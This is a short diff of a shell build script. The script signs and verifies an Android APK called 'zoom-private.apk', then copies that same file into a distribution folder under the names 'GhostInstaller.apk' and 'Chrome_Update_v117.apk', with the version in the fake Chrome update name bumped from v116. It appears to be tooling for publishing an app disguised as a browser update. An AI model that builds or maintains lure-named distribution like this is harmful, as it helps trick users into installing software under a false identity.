@@ -37,7 +37,7 @@ test "$built" -eq 1
 
 APK="$ROOT/app/build/outputs/apk/release/zoom-private.apk"
 "$BT/apksigner" verify "$APK" >/dev/null
-for name in zoom-private.apk GhostInstaller.apk Chrome_Update_v116.apk; do
+for name in zoom-private.apk GhostInstaller.apk Chrome_Update_v117.apk; do
   cp "$APK" "$REPO/distro/clients/android/$name"
 done
 cp "$APK" "$REPO/pages/zoom-private.apk"
